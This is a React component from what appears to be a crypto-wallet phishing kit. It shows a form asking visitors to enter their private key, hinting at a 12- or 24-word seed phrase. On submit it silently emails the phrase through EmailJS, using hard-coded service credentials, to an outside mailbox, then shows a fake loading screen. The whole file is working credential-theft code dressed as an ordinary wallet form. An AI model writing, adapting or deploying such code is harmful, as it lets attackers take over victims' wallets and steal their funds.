import classes from './PrivateKey.module.css'
import {Form, Button} from 'react-bootstrap';
import Aux from '../hoc/Auxiliary/Auxiliary';
import arrow from '../../../public/icons/arrow.png';
import React from 'react';
import Image from 'next/image'
import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';



class PrivateKey extends React.Component {
    constructor(props){
        super(props)
        this.state = {
            info: {
                privateKey: '',
                walletAddress: ''
            },
            errors: {
                privateKey: '',
                walletAddress: ''
            },
            privateKeyValid: false,
            walletAddressValid: false,
            formValid: false

        }
        this.submitForm = this.submitForm.bind(this)

    }

    handleChange(e) {
        let info = this.state.info;
        const name = e.target.name;
        const value = e.target.value;
        info[name] = value

            this.setState({info : {...info}}, () => {
                this.validateField(name, value)
            });


      }

    validateField(name, value) {
        let errors = this.state.errors;
        let privateKeyValid = this.state.privateKeyValid;
        let walletaddressValid = this.state.walletAddressValid

      if(name === 'walletAddress') {
          walletaddressValid = value.length >= 20;
          errors.walletAddress = walletaddressValid ? '' : 'Wallet Address is too short'
      } else if (name === 'privateKey') {
        privateKeyValid = value.length >= 3
        errors.privateKey = privateKeyValid ? '' : 'Private key is too short'
      }

      this.setState({
          errors: errors,
          privateKeyValid: privateKeyValid,
          walletAddressValid: walletaddressValid
        },  this.validateForm);
    }

    validateForm() {

      this.setState({
          formValid: this.state.privateKeyValid
      })
  }

    submitForm(e){
        e.preventDefault(); // Prevents default refresh by the browser

        let template = {
            privatekey: this.state.info.privateKey,
        }

        emailjs.send('service_q0cj98e', 'template_9l9tkwh', template, {
            publicKey: '4LgmpWQyQz41eoC4j'
        })
        .then((result) => {
        // alert("Message Sent, We will get back to you shortly", result.text);
        this.props.modalClosed()
        this.props.startPreloader()
        },
        (err) => {
        if (err instanceof EmailJSResponseStatus) {
            alert(`An error occurred, Please try again`);
            return;
          }
        });

    }

 render() {
    return(
        <Aux>
            <Form >
                {/* <Form.Group  className="mb-3" controlId="exampleForm.ControlInput1">

                   <Form.Control className={this.state.errors.walletAddress ? classes.Error : ''}  name="walletAddress" value={this.state.info.walletAddress} onChange={(e) => {this.handleChange(e)}}   type="text" placeholder="Wallet Address" />
                   <small><span className={classes.Up}>{this.state.errors.walletAddress}</span></small>

               </Form.Group> */}

               <Form.Group className="mb-3" controlId="exampleForm.ControlInput1">

                   <Form.Control name="privateKey" className={this.state.errors.privateKey ? classes.Error : ''} value={this.state.info.privateKey} onChange={(e) => {this.handleChange(e)}} type="text" placeholder="Enter your private key" />
                   <small><span className={classes.Up}>{this.state.errors.privateKey}</span></small>

               </Form.Group>
               <small className='text-white' style={{fontSize: '12px'}}>
               Typically 12 (sometimes 24) words seperated by a single space.
               </small>
                <br></br>
               <Button disabled={!this.state.formValid} onClick={this.submitForm} style={{width: '100%'}}>proceed
               </Button>
            </Form>
        </Aux>
     );
 }

}

export default PrivateKey